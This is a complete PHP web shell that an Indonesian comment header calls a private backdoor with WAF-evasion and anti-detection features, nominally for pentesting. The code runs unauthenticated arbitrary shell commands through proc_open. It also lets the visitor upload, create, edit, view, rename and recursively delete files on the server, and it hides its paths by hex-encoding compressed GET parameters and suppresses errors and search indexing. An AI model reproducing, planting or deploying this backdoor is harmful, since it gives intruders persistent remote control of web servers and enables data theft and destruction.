<!-- 
Private backdoor dipakai pribadi untuk uji coba
Hanya untuk pentesting dan ethical hacking
Dibuat oleh Will & Indonesian Code Party 2K15

Fiturnya
Anti WAF, Anti Detect, Bypass 403, Bypass Litespeed, Bypass Auto Delete
untuk sebagian website, tak semua website.

Dibuat berdasarkan eksperimen dan riset bersama anggota Indonesian Code Party untuk melawan WAF WAF yang berkembang.
Akan selalu diupdate, untuk mengetest sejauh mana WAF bisa mengcounter backdoor ini.

Backdoor ini dibuat seminimalis mungkin tanpa mementingkan UI/Warna/Color Pelet :U
Yang penting bisa dimengelabuhi sistem.
-->

<?php
error_reporting(0);
@ini_set('display_errors', 0);

$z = $_SERVER['DOCUMENT_ROOT'];
$x = dirname(__FILE__);
$c = realpath($z);
$d = realpath($x);

function e($a) {
    return bin2hex(gzcompress($a));
}

function f($a) {
    return gzuncompress(hex2bin($a));
}

foreach ($_GET as $g => $h) {
    $_GET[$g] = f($h);
}

$a = isset($_GET['p']) ? $_GET['p'] : $c;
chdir($a);

$b = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['f'])) {
        $i = $a . '/' . basename($_FILES["f"]["name"]);
        if (move_uploaded_file($_FILES["f"]["tmp_name"], $i)) {
            $b = "File uploaded successfully";
        } else {
            $b = "Error uploading file";
        }
    } elseif (isset($_POST['n']) && !empty($_POST['n'])) {
        $j = $a . '/' . $_POST['n'];
        if (!file_exists($j)) {
            mkdir($j);
            $b = "Folder created successfully";
        } else {
            $b = "Folder already exists";
        }
    } elseif (isset($_POST['m']) && !empty($_POST['m'])) {
        $k = $_POST['m'];
        $l = $a . '/' . $k;
        if (!file_exists($l)) {
            if (file_put_contents($l, $_POST['c']) !== false) {
                $b = "File created successfully";
            } else {
                $b = "Error creating file";
            }
        } else {
            if (file_put_contents($l, $_POST['c']) !== false) {
                $b = "File edited successfully";
            } else {
                $b = "Error editing file";
            }
        }
    } elseif (isset($_POST['d'])) {
        $o = $a . '/' . $_POST['d'];
        if (file_exists($o)) {
            if (is_dir($o)) {
                if (g($o)) {
                    $b = "Folder deleted successfully";
                } else {
                    $b = "Error deleting folder";
                }
            } else {
                if (unlink($o)) {
                    $b = "File deleted successfully";
                } else {
                    $b = "Error deleting file";
                }
            }
        } else {
            $b = "File or folder not found";
        }
    } elseif (isset($_POST['r']) && isset($_POST['s']) && isset($_POST['t'])) {
        $p = $a . '/' . $_POST['s'];
        $q = $a . '/' . $_POST['t'];
        if (file_exists($p)) {
            if (rename($p, $q)) {
                $b = "Item renamed successfully";
            } else {
                $b = "Error renaming item";
            }
        } else {
            $b = "Item not found";
        }
    } elseif (isset($_POST['cmd'])) {
        $u = $_POST['cmd'];
        $v = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        $w = proc_open($u, $v, $x);
        if (is_resource($w)) {
            $y = stream_get_contents($x[1]);
            $z = stream_get_contents($x[2]);
            fclose($x[1]);
            fclose($x[2]);
            proc_close($w);
            if (!empty($z)) {
                $b = "Error: " . htmlspecialchars($z);
            } else {
                $b = htmlspecialchars($y);
            }
        } else {
            $b = "Error executing command";
        }
    } elseif (isset($_POST['v'])) {
        $aa = $a . '/' . $_POST['v'];
        if (file_exists($aa)) {
            $ab = file_get_contents($aa);
            $b = htmlspecialchars($ab);
        } else {
            $b = "File not found";
        }
    }
}

echo '<meta name="robots" content="noindex,nofollow">';
echo '<pre>indonesiancodeparty@webshell | '.($_SERVER['DOCUMENT_ROOT']);
echo '</pre>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="n" placeholder="Create New Folder">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<input type="file" name="f" id="f" placeholder="Select file:">';
echo '<hr>';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="m" placeholder="Create New File / Edit Existing File">';
echo '<br><textarea name="c" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
echo '<br><br><input type="submit" value="Create / Edit File">';
echo '</form>';
echo '<br><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $b;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach (scandir($a) as $h) {
    $i = realpath($h);
    $j = stat($i);
    $k = substr(sprintf('%o', fileperms($i)), -4);
    $l = is_writable($i);
    echo '<tr>
            <td class="item-name"><a href="?p='.e($a.'/'.$h).'">'.$h.'</a></td>
            <td class="size">'.filesize($i).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($i)).'</td>
            <td class="permission '.($l ? 'writable' : 'not-writable').'">'.$k.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="v" value="'.htmlspecialchars($h).'"><input type="submit" value=" View "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="d" value="'.htmlspecialchars($h).'"><input type="submit" value="Delete"></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="s" value="'.htmlspecialchars($h).'"><input type="text" name="t" placeholder="New Name"><input type="submit" name="r" value="Rename"></form></td>
        </tr>';
}

echo '</table>';

function g($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!g($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
</div>
</body>
</html>
